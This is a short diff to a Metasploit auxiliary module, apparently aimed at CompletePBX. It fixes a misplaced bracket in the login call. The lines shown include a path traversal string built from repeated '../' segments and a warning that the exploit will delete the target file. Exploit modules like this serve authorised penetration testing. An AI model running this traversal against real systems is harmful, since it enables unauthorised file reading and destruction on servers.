@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     print_warning('This exploit WILL delete the target file if permissions allow.')
     sleep(2)
 
-    sid_cookie = completepbx_login(datastore['USERNAME', datastore['PASSWORD']])
+    sid_cookie = completepbx_login(datastore['USERNAME'], datastore['PASSWORD'])
     target_file = "../../../../../../../../../../../#{datastore['TARGETFILE']}"
 
     print_status("Attempting to read file: #{target_file}")
